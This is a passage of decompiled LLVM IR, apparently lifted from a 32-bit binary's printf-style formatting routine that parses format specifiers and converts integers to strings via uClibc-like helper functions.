  %v4_805caa6 = call i32 @__stdio_fwrite(i32 %v0_805caa6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805caa6, i32* %eax.global-to-local, align 4
  %v0_805caab = load i32, i32* @esp, align 4
  %v1_805caab = add i32 %v0_805caab, 16
  %v7_805caab = icmp slt i32 %v1_805caab, 0
  store i1 %v7_805caab, i1* %sf.global-to-local, align 1
  %v1_805caae.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805caae

dec_label_pc_805caae:                             ; preds = %dec_label_pc_805ca92, %dec_label_pc_805ca9c
  %v3_805cab6 = phi i32 [ %v2_805ca8e, %dec_label_pc_805ca92 ], [ %v1_805caae.pre, %dec_label_pc_805ca9c ]
  %v0_805caae = phi i32 [ 0, %dec_label_pc_805ca92 ], [ %v4_805caa6, %dec_label_pc_805ca9c ]
  %v2_805caae = sub i32 %v0_805caae, %v3_805cab6
  %v12_805caae = icmp eq i32 %v2_805caae, 0
  %v13_805caae = icmp slt i32 %v2_805caae, 0
  store i1 %v13_805caae, i1* %sf.global-to-local, align 1
  %v1_805cab0 = icmp eq i1 %v12_805caae, false
  %v0_805cfa7.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805cab0, label %dec_label_pc_805cfa7, label %dec_label_pc_805cab6

dec_label_pc_805cab6:                             ; preds = %dec_label_pc_805caae
  %v1_805cab6 = inttoptr i32 %v0_805cfa7.pre.pre to i32*
  %v2_805cab6 = load i32, i32* %v1_805cab6, align 4
  %v4_805cab6 = add i32 %v2_805cab6, %v3_805cab6
  %v15_805cab6 = icmp slt i32 %v4_805cab6, 0
  store i1 %v15_805cab6, i1* %sf.global-to-local, align 1
  store i32 %v4_805cab6, i32* %v1_805cab6, align 4
  %v0_805cab9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805cab9

dec_label_pc_805cab9:                             ; preds = %dec_label_pc_805ca8e, %dec_label_pc_805cab6
  %v0_805cf9f = phi i32 [ %v0_805ca92, %dec_label_pc_805ca8e ], [ %v0_805cab9.pre, %dec_label_pc_805cab6 ]
  %v1_805cab9 = inttoptr i32 %v0_805cf9f to i8*
  %v2_805cab9 = load i8, i8* %v1_805cab9, align 1
  %v3_805cab9 = icmp eq i8 %v2_805cab9, 0
  %v4_805cab9 = icmp slt i8 %v2_805cab9, 0
  store i1 %v4_805cab9, i1* %sf.global-to-local, align 1
  br i1 %v3_805cab9, label %dec_label_pc_805cfae, label %dec_label_pc_805cac2

dec_label_pc_805cac2:                             ; preds = %dec_label_pc_805cab9
  %v1_805cac2 = add i32 %v0_805cf9f, 1
  %v2_805cac2 = inttoptr i32 %v1_805cac2 to i8*
  %v3_805cac2 = load i8, i8* %v2_805cac2, align 1
  %v4_805cac2 = add i8 %v3_805cac2, -37
  %v12_805cac2 = icmp eq i8 %v4_805cac2, 0
  %v13_805cac2 = icmp slt i8 %v4_805cac2, 0
  store i1 %v13_805cac2, i1* %sf.global-to-local, align 1
  store i32 %v1_805cac2, i32* %edx.global-to-local, align 4
  br i1 %v12_805cac2, label %dec_label_pc_805cf9f, label %dec_label_pc_805cacf

dec_label_pc_805cacf:                             ; preds = %dec_label_pc_805cac2
  %v1_805cacf = load i32, i32* @esp, align 4
  %v2_805cacf = add i32 %v1_805cacf, 16
  %v3_805cacf = inttoptr i32 %v2_805cacf to i32*
  store i32 %v1_805cac2, i32* %v3_805cacf, align 4
  %v0_805cad3 = load i32, i32* @esp, align 4
  %v1_805cad3 = add i32 %v0_805cad3, 340
  %v2_805cad3 = inttoptr i32 %v1_805cad3 to i32*
  store i32 0, i32* %v2_805cad3, align 4
  %v0_805cade = load i32, i32* @esp, align 4
  %v1_805cade = add i32 %v0_805cade, -12
  %v10_805cade = icmp slt i32 %v1_805cade, 0
  store i1 %v10_805cade, i1* %sf.global-to-local, align 1
  %v1_805cae1 = add i32 %v0_805cade, 16
  store i32 %v1_805cae1, i32* @ebx, align 4
  %v2_805cae5 = add i32 %v0_805cade, -16
  %v3_805cae5 = inttoptr i32 %v2_805cae5 to i32*
  store i32 %v1_805cae1, i32* %v3_805cae5, align 4
  %v0_805cae6 = load i32, i32* %stack_var_-364, align 4
  %v1_805cae6 = inttoptr i32 %v0_805cae6 to i32*
  %v2_805cae6 = call i32 @_ppfs_parsespec(i32* %v1_805cae6)
  store i32 %v2_805cae6, i32* %eax.global-to-local, align 4
  %v0_805caeb = load i32, i32* @ebx, align 4
  %v1_805caeb = load i32, i32* @esp, align 4
  %v2_805caeb = inttoptr i32 %v1_805caeb to i32*
  store i32 %v0_805caeb, i32* %v2_805caeb, align 4
  %v0_805caee = load i32, i32* %stack_var_-364, align 4
  %v1_805caee = call i32 @_ppfs_setargs(i32 %v0_805caee)
  store i32 %v1_805caee, i32* %eax.global-to-local, align 4
  %v0_805caf3 = load i32, i32* @esp, align 4
  %v1_805caf3 = add i32 %v0_805caf3, 70
  %v2_805caf3 = inttoptr i32 %v1_805caf3 to i8*
  %v3_805caf3 = load i8, i8* %v2_805caf3, align 1
  %v4_805caf3 = zext i8 %v3_805caf3 to i32
  store i32 %v4_805caf3, i32* @edi, align 4
  %v1_805caf8 = add i32 %v0_805caf3, 16
  %v1_805cafb = add i32 %v0_805caf3, 56
  %v2_805cafb = inttoptr i32 %v1_805cafb to i32*
  %v3_805cafb = load i32, i32* %v2_805cafb, align 4
  %v5_805cafb = icmp slt i32 %v3_805cafb, 0
  store i1 %v5_805cafb, i1* %sf.global-to-local, align 1
  %v1_805cb00 = add i32 %v0_805caf3, 112
  store i32 %v1_805cb00, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_805cafb, 1
  br i1 %tmp68, label %dec_label_pc_805cb0d, label %dec_label_pc_805cb06

dec_label_pc_805cb06:                             ; preds = %dec_label_pc_805cacf
  %v2_805cb06 = zext i8 %v3_805caf3 to i32
  %v3_805cb06 = mul nuw nsw i32 %v2_805cb06, 12
  store i32 %v3_805cb06, i32* %eax.global-to-local, align 4
  %v2_805cb09 = add i32 %v0_805caf3, 100
  %v3_805cb09 = add i32 %v2_805cb09, %v3_805cb06
  store i32 %v3_805cb09, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805cb0d

dec_label_pc_805cb0d:                             ; preds = %dec_label_pc_805cacf, %dec_label_pc_805cb06
  %v0_805cb1529 = phi i32 [ %v1_805cb00, %dec_label_pc_805cacf ], [ %v3_805cb09, %dec_label_pc_805cb06 ]
  %v1_805cb0d = add i32 %v0_805caf3, 60
  %v2_805cb0d = inttoptr i32 %v1_805cb0d to i32*
  %v3_805cb0d = load i32, i32* %v2_805cb0d, align 4
  store i32 %v3_805cb0d, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805cb2074 = sub i32 0, %v3_805cb0d
  %v10_805cb2077 = and i32 %v3_805cb0d, %v2_805cb2074
  %v11_805cb2078 = icmp slt i32 %v10_805cb2077, 0
  %v13_805cb2079 = icmp slt i32 %v2_805cb2074, 0
  %v2_805cb2280 = icmp eq i1 %v13_805cb2079, %v11_805cb2078
  br i1 %v2_805cb2280, label %dec_label_pc_805cb24, label %dec_label_pc_805cb15

dec_label_pc_805cb15:                             ; preds = %dec_label_pc_805cb0d, %dec_label_pc_805cb15
  %v0_805cb2484 = phi i32 [ %v0_805cb24, %dec_label_pc_805cb15 ], [ %v1_805caf8, %dec_label_pc_805cb0d ]
  %v2_805cb1583 = phi i32 [ %v1_805cb1f, %dec_label_pc_805cb15 ], [ 0, %dec_label_pc_805cb0d ]
  %v0_805cb1582 = phi i32 [ %v1_805cb1c, %dec_label_pc_805cb15 ], [ %v0_805cb1529, %dec_label_pc_805cb0d ]
  %v3_805cb15 = mul i32 %v2_805cb1583, 4
  %v4_805cb15 = add i32 %v3_805cb15, 344
  %v5_805cb15 = add i32 %v4_805cb15, %v0_805cb2484
  %v6_805cb15 = inttoptr i32 %v5_805cb15 to i32*
  store i32 %v0_805cb1582, i32* %v6_805cb15, align 4
  %v0_805cb1c = load i32, i32* %edx.global-to-local, align 4
  %v1_805cb1c = add i32 %v0_805cb1c, 12
  store i32 %v1_805cb1c, i32* %edx.global-to-local, align 4
  %v0_805cb1f = load i32, i32* %eax.global-to-local, align 4
  %v1_805cb1f = add i32 %v0_805cb1f, 1
  %v1_805cb20.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_805cb1f, i32* %eax.global-to-local, align 4
  %v2_805cb20 = sub i32 %v1_805cb1f, %v1_805cb20.pre
  %v8_805cb20 = xor i32 %v1_805cb1f, %v1_805cb20.pre
  %v9_805cb20 = xor i32 %v2_805cb20, %v1_805cb1f
  %v10_805cb20 = and i32 %v9_805cb20, %v8_805cb20
  %v11_805cb20 = icmp slt i32 %v10_805cb20, 0
  %v13_805cb20 = icmp slt i32 %v2_805cb20, 0
  %v2_805cb22 = icmp eq i1 %v13_805cb20, %v11_805cb20
  %v0_805cb24 = load i32, i32* @esp, align 4
  br i1 %v2_805cb22, label %dec_label_pc_805cb24, label %dec_label_pc_805cb15

dec_label_pc_805cb24:                             ; preds = %dec_label_pc_805cb15, %dec_label_pc_805cb0d
  %v0_805cb24.lcssa = phi i32 [ %v1_805caf8, %dec_label_pc_805cb0d ], [ %v0_805cb24, %dec_label_pc_805cb15 ]
  %v1_805cb24 = add i32 %v0_805cb24.lcssa, 48
  %v2_805cb24 = inttoptr i32 %v1_805cb24 to i32*
  %v3_805cb24 = load i32, i32* %v2_805cb24, align 4
  store i32 %v3_805cb24, i32* @ecx, align 4
  %v1_805cb28 = icmp eq i32 %v3_805cb24, 0
  %v2_805cb28 = icmp slt i32 %v3_805cb24, 0
  store i1 %v2_805cb28, i1* %sf.global-to-local, align 1
  %v1_805cb2a = icmp eq i1 %v1_805cb28, false
  br i1 %v1_805cb2a, label %dec_label_pc_805cb52, label %dec_label_pc_805cb2c

dec_label_pc_805cb2c:                             ; preds = %dec_label_pc_805cb24
  %v1_805cb2c = inttoptr i32 %v0_805cb24.lcssa to i32*
  %v2_805cb2c = load i32, i32* %v1_805cb2c, align 4
  store i32 %v2_805cb2c, i32* %eax.global-to-local, align 4
  %v1_805cb2f = ashr i32 %v2_805cb2c, 31
  store i32 %v1_805cb2f, i32* %edx.global-to-local, align 4
  %v2_805cb30 = add i32 %v0_805cb24.lcssa, -4
  %v3_805cb30 = inttoptr i32 %v2_805cb30 to i32*
  store i32 %v1_805cb2f, i32* %v3_805cb30, align 4
  %v0_805cb31 = load i32, i32* %eax.global-to-local, align 4
  %v2_805cb31 = add i32 %v0_805cb24.lcssa, -8
  %v3_805cb31 = inttoptr i32 %v2_805cb31 to i32*
  store i32 %v0_805cb31, i32* %v3_805cb31, align 4
  %v1_805cb32 = add i32 %v0_805cb24.lcssa, 32
  %v2_805cb32 = inttoptr i32 %v1_805cb32 to i32*
  %v3_805cb32 = load i32, i32* %v2_805cb32, align 4
  %v1_805cb36 = and i32 %v3_805cb32, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805cb36, i32* %eax.global-to-local, align 4
  %v2_805cb3b = add i32 %v0_805cb24.lcssa, -12
  %v3_805cb3b = inttoptr i32 %v2_805cb3b to i32*
  store i32 %v1_805cb36, i32* %v3_805cb3b, align 4
  %v1_805cb3c = add i32 %v0_805cb24.lcssa, 344
  %v2_805cb3c = inttoptr i32 %v1_805cb3c to i32*
  %v3_805cb3c = load i32, i32* %v2_805cb3c, align 4
  store i32 %v3_805cb3c, i32* %eax.global-to-local, align 4
  %v1_805cb43 = inttoptr i32 %v3_805cb3c to i32*
  %v2_805cb43 = load i32, i32* %v1_805cb43, align 4
  %v4_805cb43 = add i32 %v0_805cb24.lcssa, -16
  %v5_805cb43 = inttoptr i32 %v4_805cb43 to i32*
  store i32 %v2_805cb43, i32* %v5_805cb43, align 4
  %v0_805cb45 = call i32 @_store_inttype()
  store i32 %v0_805cb45, i32* %eax.global-to-local, align 4
  %v0_805cb4a = load i32, i32* @esp, align 4
  %v1_805cb4a = add i32 %v0_805cb4a, 16
  %v7_805cb4a = icmp slt i32 %v1_805cb4a, 0
  store i1 %v7_805cb4a, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805cf94

dec_label_pc_805cb52:                             ; preds = %dec_label_pc_805cb24
  %v1_805cb52 = add i32 %v3_805cb24, -7
  %v5_805cb52 = icmp ult i32 %v3_805cb24, 7
  %v9_805cb52 = icmp eq i32 %v1_805cb52, 0
  %v10_805cb52 = icmp slt i32 %v1_805cb52, 0
  store i1 %v10_805cb52, i1* %sf.global-to-local, align 1
  %v2_805cb55 = or i1 %v5_805cb52, %v9_805cb52
  br i1 %v2_805cb55, label %dec_label_pc_805cb5b, label %dec_label_pc_805ccbf

dec_label_pc_805cb5b:                             ; preds = %dec_label_pc_805cb52
  %v1_805cb5b = add i32 %v3_805cb24, 134666500
  %v2_805cb5b = inttoptr i32 %v1_805cb5b to i8*
  %v3_805cb5b = load i8, i8* %v2_805cb5b, align 1
  %v4_805cb5b = sext i8 %v3_805cb5b to i32
  store i32 %v4_805cb5b, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_805cb67 = icmp eq i8 %v3_805cb5b, 10
  %v10_805cb67 = icmp slt i8 %v3_805cb5b, 10
  store i1 %v10_805cb67, i1* %sf.global-to-local, align 1
  %v1_805cb6a = icmp eq i1 %v9_805cb67, false
  br i1 %v1_805cb6a, label %dec_label_pc_805cb8a, label %dec_label_pc_805cb6c

dec_label_pc_805cb6c:                             ; preds = %dec_label_pc_805cb5b
  %v1_805cb6c = add i32 %v0_805cb24.lcssa, 32
  %v2_805cb6c = inttoptr i32 %v1_805cb6c to i32*
  %v3_805cb6c = load i32, i32* %v2_805cb6c, align 4
  store i32 %v3_805cb6c, i32* %eax.global-to-local, align 4
  %v1_805cb72 = udiv i32 %v3_805cb6c, 32
  %tmp69 = urem i32 %v1_805cb72, 2
  %tmp70 = sub nsw i32 45, %tmp69
  %v2_805cb82 = or i32 %tmp70, 128
  store i32 %v2_805cb82, i32* %edx.global-to-local, align 4
  %v2_805cb85 = and i32 %v3_805cb6c, 64
  %v3_805cb85 = icmp eq i32 %v2_805cb85, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805cb87 = icmp eq i1 %v3_805cb85, false
  %v4_805cb87 = select i1 %v1_805cb87, i32 %v2_805cb82, i32 %tmp70
  store i32 %v4_805cb87, i32* @ebx, align 4
  br label %dec_label_pc_805cb8a

dec_label_pc_805cb8a:                             ; preds = %dec_label_pc_805cb5b, %dec_label_pc_805cb6c
  %v1_805cb8a = add i32 %v3_805cb24, -5
  %v5_805cb8a = icmp ult i32 %v3_805cb24, 5
  %v9_805cb8a = icmp eq i32 %v1_805cb8a, 0
  %v10_805cb8a = icmp slt i32 %v1_805cb8a, 0
  store i1 %v10_805cb8a, i1* %sf.global-to-local, align 1
  %v2_805cb8d = or i1 %v5_805cb8a, %v9_805cb8a
  br i1 %v2_805cb8d, label %dec_label_pc_805cb8f, label %dec_label_pc_805cba7

dec_label_pc_805cb8f:                             ; preds = %dec_label_pc_805cb8a
  %v1_805cb8f = add i32 %v3_805cb24, -3
  %v9_805cb8f = icmp eq i32 %v1_805cb8f, 0
  %v10_805cb8f = icmp slt i32 %v1_805cb8f, 0
  store i1 %v10_805cb8f, i1* %sf.global-to-local, align 1
  %v1_805cb92 = icmp eq i1 %v9_805cb8f, false
  br i1 %v1_805cb92, label %dec_label_pc_805cb9b, label %dec_label_pc_805cb94

dec_label_pc_805cb94:                             ; preds = %dec_label_pc_805cb8f
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_805cba9

dec_label_pc_805cb9b:                             ; preds = %dec_label_pc_805cb8f
  %v1_805cb9b = add i32 %v3_805cb24, -1
  %v9_805cb9b = icmp eq i32 %v1_805cb9b, 0
  %v10_805cb9b = icmp slt i32 %v1_805cb9b, 0
  store i1 %v10_805cb9b, i1* %sf.global-to-local, align 1
  br i1 %v9_805cb9b, label %dec_label_pc_805cbae, label %dec_label_pc_805cba9

dec_label_pc_805cba7:                             ; preds = %dec_label_pc_805cb8a
  %v1_805cba7 = sub nsw i32 0, %v4_805cb5b
  %v7_805cba7 = icmp sgt i8 %v3_805cb5b, 0
  store i1 %v7_805cba7, i1* %sf.global-to-local, align 1
  store i32 %v1_805cba7, i32* @esi, align 4
  br label %dec_label_pc_805cba9

dec_label_pc_805cba9:                             ; preds = %dec_label_pc_805cb9b, %dec_label_pc_805cb94, %dec_label_pc_805cba7
  br label %dec_label_pc_805cbae

dec_label_pc_805cbae:                             ; preds = %dec_label_pc_805cb9b, %dec_label_pc_805cba9
  %storemerge = phi i32 [ 11, %dec_label_pc_805cba9 ], [ 6, %dec_label_pc_805cb9b ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_805cbae = add i32 %v0_805cb24.lcssa, 20
  %v2_805cbae = inttoptr i32 %v1_805cbae to i32*
  %v3_805cbae = load i32, i32* %v2_805cbae, align 4
  %v5_805cbae = icmp slt i32 %v3_805cbae, 0
  store i1 %v5_805cbae, i1* %sf.global-to-local, align 1
  %v1_805cbb3 = add i32 %v0_805cb24.lcssa, 7
  %v2_805cbb3 = inttoptr i32 %v1_805cbb3 to i8*
  store i8 32, i8* %v2_805cbb3, align 1
  %v0_805cbb8 = load i1, i1* %sf.global-to-local, align 1
  %v1_805cbb8 = icmp eq i1 %v0_805cbb8, false
  br i1 %v1_805cbb8, label %dec_label_pc_805cbc2, label %dec_label_pc_805cbba

dec_label_pc_805cbba:                             ; preds = %dec_label_pc_805cbae
  %v0_805cbba = load i32, i32* @esp, align 4
  %v1_805cbba = add i32 %v0_805cbba, 36
  %v2_805cbba = inttoptr i32 %v1_805cbba to i8*
  %v3_805cbba = load i8, i8* %v2_805cbba, align 1
  %v4_805cbba = zext i8 %v3_805cbba to i32
  %v5_805cbba = load i32, i32* %edx.global-to-local, align 4
  %v6_805cbba = and i32 %v5_805cbba, -256
  %v7_805cbba = or i32 %v6_805cbba, %v4_805cbba
  store i32 %v7_805cbba, i32* %edx.global-to-local, align 4
  %v3_805cbbe = add i32 %v0_805cbba, 7
  %v4_805cbbe = inttoptr i32 %v3_805cbbe to i8*
  store i8 %v3_805cbba, i8* %v4_805cbbe, align 1
  br label %dec_label_pc_805cbc2

dec_label_pc_805cbc2:                             ; preds = %dec_label_pc_805cbae, %dec_label_pc_805cbba
  %v1_805cbc2 = add i32 %v3_805cb24, -1
  %v8_805cbc2 = icmp eq i32 %v1_805cbc2, 0
  %v9_805cbc2 = icmp slt i32 %v1_805cbc2, 0
  store i1 %v9_805cbc2, i1* %sf.global-to-local, align 1
  store i32 %v1_805cbc2, i32* %ecx.global-to-local, align 4
  %v0_805cbc3 = load i32, i32* @esp, align 4
  %v1_805cbc3 = add i32 %v0_805cbc3, 344
  %v2_805cbc3 = inttoptr i32 %v1_805cbc3 to i32*
  %v3_805cbc3 = load i32, i32* %v2_805cbc3, align 4
  store i32 %v3_805cbc3, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_805cbdb.pre = load i32, i32* @edi, align 4
  br i1 %v8_805cbc2, label %dec_label_pc_805cbdb, label %dec_label_pc_805cbd1

dec_label_pc_805cbd1:                             ; preds = %dec_label_pc_805cbc2
  %v2_805cbd1 = mul i32 %v0_805cbdb.pre, 4
  %v3_805cbd1 = add i32 %v0_805cbc3, 52
  %v4_805cbd1 = add i32 %v3_805cbd1, %v2_805cbd1
  %v5_805cbd1 = inttoptr i32 %v4_805cbd1 to i32*
  %v6_805cbd1 = load i32, i32* %v5_805cbd1, align 4
  %v1_805cbd5 = and i32 %v6_805cbd1, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_805cbd5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805cbdb

dec_label_pc_805cbdb:                             ; preds = %dec_label_pc_805cbc2, %dec_label_pc_805cbd1
  %v2_805cbdb = add i32 %v0_805cbc3, -4
  %v3_805cbdb = inttoptr i32 %v2_805cbdb to i32*
  store i32 %v0_805cbdb.pre, i32* %v3_805cbdb, align 4
  %v0_805cbdc = load i32, i32* @esi, align 4
  %v2_805cbdc = add i32 %v0_805cbc3, -8
  %v3_805cbdc = inttoptr i32 %v2_805cbdc to i32*
  store i32 %v0_805cbdc, i32* %v3_805cbdc, align 4
  %v0_805cbdd = load i32, i32* %eax.global-to-local, align 4
  %v2_805cbdd = add i32 %v0_805cbc3, -12
  %v3_805cbdd = inttoptr i32 %v2_805cbdd to i32*
  store i32 %v0_805cbdd, i32* %v3_805cbdd, align 4
  %v0_805cbde = load i32, i32* %edx.global-to-local, align 4
  %v2_805cbde = add i32 %v0_805cbc3, -16
  %v3_805cbde = inttoptr i32 %v2_805cbde to i32*
  store i32 %v0_805cbde, i32* %v3_805cbde, align 4
  %v0_805cbdf = call i32 @_load_inttype()
  %v0_805cbe4 = load i32, i32* @ebx, align 4
  %v1_805cbe4 = load i32, i32* @esp, align 4
  %v2_805cbe4 = inttoptr i32 %v1_805cbe4 to i32*
  store i32 %v0_805cbe4, i32* %v2_805cbe4, align 4
  %v0_805cbe7 = load i32, i32* @esi, align 4
  %v1_805cbe7 = load i32, i32* @esp, align 4
  %v2_805cbe7 = add i32 %v1_805cbe7, -4
  %v3_805cbe7 = inttoptr i32 %v2_805cbe7 to i32*
  store i32 %v0_805cbe7, i32* %v3_805cbe7, align 4
  %v0_805cbe8 = load i32, i32* @edx, align 4
  %v2_805cbe8 = add i32 %v1_805cbe7, -8
  %v3_805cbe8 = inttoptr i32 %v2_805cbe8 to i32*
  store i32 %v0_805cbe8, i32* %v3_805cbe8, align 4
  %v2_805cbe9 = add i32 %v1_805cbe7, -12
  %v3_805cbe9 = inttoptr i32 %v2_805cbe9 to i32*
  store i32 %v0_805cbdf, i32* %v3_805cbe9, align 4
  %v1_805cbea = add i32 %v1_805cbe7, 347
  store i32 %v1_805cbea, i32* %eax.global-to-local, align 4
  %v2_805cbf1 = add i32 %v1_805cbe7, -16
  %v3_805cbf1 = inttoptr i32 %v2_805cbf1 to i32*
  store i32 %v1_805cbea, i32* %v3_805cbf1, align 4
  %v0_805cbf2 = load i32, i32* %stack_var_-364, align 4
  %v5_805cbf2 = inttoptr i32 %v0_805cbf2 to i8*
  %v6_805cbf2 = call i32 @_uintmaxtostr(i8* %v5_805cbf2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_805cbf2, i32* %eax.global-to-local, align 4
  %v0_805cbf7 = load i32, i32* @esp, align 4
  %v1_805cbf7 = add i32 %v0_805cbf7, 32
  %v1_805cbfa = add i32 %v0_805cbf7, 80
  %v2_805cbfa = inttoptr i32 %v1_805cbfa to i32*
  %v3_805cbfa = load i32, i32* %v2_805cbfa, align 4
  %v4_805cbfa = add i32 %v3_805cbfa, -5
  %v8_805cbfa = icmp ult i32 %v3_805cbfa, 5
  %v12_805cbfa = icmp eq i32 %v4_805cbfa, 0
  %v13_805cbfa = icmp slt i32 %v4_805cbfa, 0
  store i1 %v13_805cbfa, i1* %sf.global-to-local, align 1
  store i32 %v6_805cbf2, i32* @edi, align 4
  %v2_805cc01 = or i1 %v8_805cbfa, %v12_805cbfa
  br i1 %v2_805cc01, label %dec_label_pc_805cc2b, label %dec_label_pc_805cc03

dec_label_pc_805cc03:                             ; preds = %dec_label_pc_805cbdb
  %v7_805cbf2 = inttoptr i32 %v6_805cbf2 to i8*
  %v3_805cc03 = load i8, i8* %v7_805cbf2, align 1
  %v4_805cc03 = add i8 %v3_805cc03, -45
  %v12_805cc03 = icmp eq i8 %v4_805cc03, 0
  %v13_805cc03 = icmp slt i8 %v4_805cc03, 0
  store i1 %v13_805cc03, i1* %sf.global-to-local, align 1
  %v1_805cc06 = icmp eq i1 %v12_805cc03, false
  %v1_805cc15 = add i32 %v0_805cbf7, 64
  %v2_805cc15 = inttoptr i32 %v1_805cc15 to i32*
  %v3_805cc15 = load i32, i32* %v2_805cc15, align 4
  br i1 %v1_805cc06, label %dec_label_pc_805cc15, label %dec_label_pc_805cc08

dec_label_pc_805cc08:                             ; preds = %dec_label_pc_805cc03
  %v4_805cc08 = or i32 %v3_805cc15, 2
  store i32 %v4_805cc08, i32* %v2_805cc15, align 4
  %v0_805cc0d = load i32, i32* @edi, align 4
  %v1_805cc0d = add i32 %v0_805cc0d, 1
  %v9_805cc0d = icmp slt i32 %v1_805cc0d, 0
  store i1 %v9_805cc0d, i1* %sf.global-to-local, align 1
  store i32 %v1_805cc0d, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_805cc2b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805cc15:                             ; preds = %dec_label_pc_805cc03
  store i32 %v3_805cc15, i32* %eax.global-to-local, align 4
  %v2_805cc19 = and i32 %v3_805cc15, 2
  %v3_805cc19 = icmp eq i32 %v2_805cc19, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_805cc19, label %dec_label_pc_805cc21, label %dec_label_pc_805cc1d

dec_label_pc_805cc1d:                             ; preds = %dec_label_pc_805cc15
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805cc21:                             ; preds = %dec_label_pc_805cc15
  %v2_805cc21 = urem i32 %v3_805cc15, 2
  %v3_805cc21 = icmp eq i32 %v2_805cc21, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_805cc28 = icmp eq i1 %v3_805cc21, false
  %v2_805cc28 = load i32, i32* @ebp, align 4
  %v4_805cc28 = select i1 %v1_805cc28, i32 4, i32 %v2_805cc28
  store i32 %v4_805cc28, i32* @ebp, align 4
  br label %dec_label_pc_805cc2b

dec_label_pc_805cc2b:                             ; preds = %dec_label_pc_805cbdb, %dec_label_pc_805cc1d, %dec_label_pc_805cc08, %dec_label_pc_805cc21
  %v0_805cc7d = phi i32 [ %v6_805cbf2, %dec_label_pc_805cbdb ], [ %v6_805cbf2, %dec_label_pc_805cc1d ], [ %v1_805cc0d, %dec_label_pc_805cc08 ], [ %v6_805cbf2, %dec_label_pc_805cc21 ]
  %v0_805cc8d = phi i32 [ %v1_805cbf7, %dec_label_pc_805cbdb ], [ %v1_805cbf7, %dec_label_pc_805cc1d ], [ %v0_805cc2b.pre, %dec_label_pc_805cc08 ], [ %v1_805cbf7, %dec_label_pc_805cc21 ]
  %v1_805cc2b = add i32 %v0_805cc8d, 20
  %v2_805cc2b = inttoptr i32 %v1_805cc2b to i32*
  %v3_805cc2b = load i32, i32* %v2_805cc2b, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805cc2f = sub i32 204, %v0_805cc7d
  %v2_805cc3b = add i32 %v1_805cc2f, %v0_805cc8d
  %v1_805cc3d = add i32 %v2_805cc3b, 127
  store i32 %v1_805cc3d, i32* @esi, align 4
  %v2_805cc40 = icmp slt i32 %v3_805cc2b, 0
  store i1 %v2_805cc40, i1* %sf.global-to-local, align 1
  %v3_805cc42 = select i1 %v2_805cc40, i32 1, i32 %v3_805cc2b
  store i32 %v3_805cc42, i32* %ecx.global-to-local, align 4
  %v1_805cc45 = add i32 %v0_805cc8d, 32
  %v2_805cc45 = inttoptr i32 %v1_805cc45 to i8*
  %v3_805cc45 = load i8, i8* %v2_805cc45, align 1
  %v4_805cc45 = and i8 %v3_805cc45, 16
  %v5_805cc45 = icmp eq i8 %v4_805cc45, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_805cc45, label %dec_label_pc_805cc7d, label %dec_label_pc_805cc4c

dec_label_pc_805cc4c:                             ; preds = %dec_label_pc_805cc2b
  %v1_805cc4c = add i32 %v0_805cc8d, 48
  %v2_805cc4c = inttoptr i32 %v1_805cc4c to i32*
  %v3_805cc4c = load i32, i32* %v2_805cc4c, align 4
  store i32 %v3_805cc4c, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp71 = icmp ult i32 %v3_805cc4c, 3
  %v3_805cc55 = load i32, i32* @ebp, align 4
  %v5_805cc55 = select i1 %tmp71, i32 6, i32 %v3_805cc55
  store i32 %v5_805cc55, i32* @ebp, align 4
  %v1_805cc58 = add i32 %v3_805cc4c, -3
  %v9_805cc58 = icmp eq i32 %v1_805cc58, 0
  %v10_805cc58 = icmp slt i32 %v1_805cc58, 0
  store i1 %v10_805cc58, i1* %sf.global-to-local, align 1
  %v1_805cc5b = icmp eq i1 %v9_805cc58, false
  br i1 %v1_805cc5b, label %dec_label_pc_805cc64, label %dec_label_pc_805cc5d

dec_label_pc_805cc5d:                             ; preds = %dec_label_pc_805cc4c
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_805cc7d

dec_label_pc_805cc64:                             ; preds = %dec_label_pc_805cc4c
  %v1_805cc64 = add i32 %v3_805cc4c, -4
  %v9_805cc64 = icmp eq i32 %v1_805cc64, 0
  %v10_805cc64 = icmp slt i32 %v1_805cc64, 0
  store i1 %v10_805cc64, i1* %sf.global-to-local, align 1
  %v1_805cc67 = icmp eq i1 %v9_805cc64, false
  br i1 %v1_805cc67, label %dec_label_pc_805cc7d, label %dec_label_pc_805cc69

dec_label_pc_805cc69:                             ; preds = %dec_label_pc_805cc64
  %v2_805cc69 = sub i32 %v3_805cc42, %v1_805cc3d
  %v7_805cc69 = icmp ult i32 %v3_805cc42, %v1_805cc3d
  %v12_805cc69 = icmp eq i32 %v2_805cc69, 0
